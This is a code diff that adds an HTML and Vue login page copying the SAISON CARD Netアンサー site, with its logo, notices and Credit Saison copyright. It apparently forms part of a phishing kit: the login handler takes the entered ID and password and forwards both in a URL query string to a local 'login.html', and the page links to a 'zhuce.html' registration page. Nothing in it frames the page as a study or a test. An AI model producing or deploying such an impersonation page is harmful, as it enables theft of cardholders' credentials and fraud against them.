@@ -1,0 +1,102 @@
+<html><head>
+		<meta charset="UTF-8">
+		<title>SAISON CARD Netアンサー</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+		
+		<link rel="stylesheet" href="../css/index.css">
+	</head>
+	<body>
+		<div id="app"><div id="nav"><img src="../img/logo.jpg"><a>SAISON CARD Netアンサー</a></div> <div id="main"><div id="left"><div id="index"><p class="title">ログイン</p> <input type="text" id="name" class="input"> <input type="text" id="password" class="input"> <div id="btn1div"><input type="button" id="next" value="ログイン"></div> <div id="btn2div"><input type="button" id="prev" value="次回からワンクリックでログイン"></div> <p class="pword">Netアンサー新規登録（無料）<br></p><p class="pword">ID・パスワードをお忘れの方<br></p><p class="pword">よくあるお問い合わせ<br></p><p class="pword">メンテナンス情報<br></p></div></div> <div id="right"><div id="right-one"><img src="../img/2202_login_520_230.jpg"></div> <div id="right-two"><div id="right-two-nav">重要なお知らせ</div> <div id="right-two-nav1">クラブ・オン／ミレニアムカードをご利用のお客様はこちらからログインしてください。</div> <div class="right-two-p2"><img src="../img/player.png"><p>ログイン画面でIDが貼り付いて他のカードに切り替えできない場合はこちら</p></div><div class="right-two-p2"><img src="../img/player.png"><p>パズル認証の鍵を動かすことが困難な方はインフォメーションセンターにお電話ください</p></div><div class="right-two-p2"><img src="../img/player.png"><p>Netアンサーを装ったサイトにご注意ください</p></div></div> <div id="right-there"><div id="right-there-nav">Netアンサー推奨環境</div> <p>Netアンサーは、以下のOS、ブラウザでのご利用をおすすめいたします。<a>（2020年12月24日 更新）</a></p> <table><tbody><tr><th>Windows 8.1 10</th><th>Internet Explorer 11 / Microsoft Edge 81以上 / Firefox 75以上 / Chrome 81以上</th></tr> <tr><th>Mac OS X 10.15以降</th><th>Safari 13以上</th></tr></tbody></table></div></div> <div id="bottom"><img src="../img/bottom.png" style="width: 140px; height: 25px;"> <p>Copyright © CREDIT SAISON CO., LTD. All Rights Reserved.</p></div></div></div>
+	
+	
+	<script>
+		const app=new Vue({
+			el:'#app',
+			data:{
+				message:"hello",
+				title:'SAISON CARD Netアンサー',
+				indextitle:'ログイン',
+				IDValue:'ID',
+				PaValue:'パスワード',
+				inputboor:true,
+				inputboor1:true,
+				btn1:'ログイン',
+				imgarr:["../img/1647270868(1).png","../img/1647270884(1).png","../img/1647270902(1).png"],
+				btn2:'次回からワンクリックでログイン',
+				pword:["Netアンサー新規登録（無料）","ID・パスワードをお忘れの方","よくあるお問い合わせ","メンテナンス情報"],
+				righttwotitle:'重要なお知らせ',
+				righttwotitle1:'クラブ・オン／ミレニアムカードをご利用のお客様はこちらからログインしてください。',
+				righttwop1:'',
+			    righttwop2:["ログイン画面でIDが貼り付いて他のカードに切り替えできない場合はこちら","パズル認証の鍵を動かすことが困難な方はインフォメーションセンターにお電話ください","Netアンサーを装ったサイトにご注意ください"],
+                righttheretilte:'Netアンサー推奨環境'			
+			},
+			methods:{
+				namefocus(){
+					if(this.IDValue=="ID"){
+					this.IDValue="";
+					this.inputboor=!this.inputboor;	
+					}					
+				},
+				namefocusout(){
+					if(this.IDValue==""){
+					this.IDValue="ID";
+					this.inputboor=!this.inputboor;	
+					}	
+					
+				},
+				change(){
+					document.getElementsByClassName('yzmimg')[0].src=this.imgarr[Math.floor(Math.random()*3)] 
+				},
+				pafocus(){
+					if(this.PaValue=="パスワード"){
+					this.PaValue="";
+					this.inputboor1=!this.inputboor1;
+					document.getElementById('password').type="password";
+					}
+				},
+				pafocusout(){
+					if(this.PaValue==""){
+						this.PaValue="パスワード";
+						this.inputboor1=!this.inputboor1;
+			          document.getElementById('password').type="text";
+					}				
+				},
+				btn1click(){
+					let name=document.getElementById('name').value;
+					let password1=document.getElementById('password').value;
+					if(name==""||name=="ID"||password1==""||password1=="パスワード"){
+						alert("必要事項は記入していません。");
+					}
+					else{
+						let myurl="login.html"+"?"+name+"?"+password1;
+						window.location.assign(myurl);
+					}
+				},
+				tp(i){
+					if(i==0){
+						window.location.href="zhuce.html";
+					}
+					else{
+						window.location.href="https://www.a-q-f.com/saison/plus/lp/c08.html?waad=yuUxAgWm";
+					}
+					
+				}
+			},
+			watch:{
+				IDValue(newValue){
+					if(this.IDValue==""){
+					/*	this.inputboor=!this.inputboor;*/
+					}
+				},
+				PaValue(newValue){
+					if(this.PaValue==""){
+					/*	this.inputboor1=!this.inputboor1;*/
+					}
+				}
+			}
+		})
+		
+	</script>
+
+</body></html>
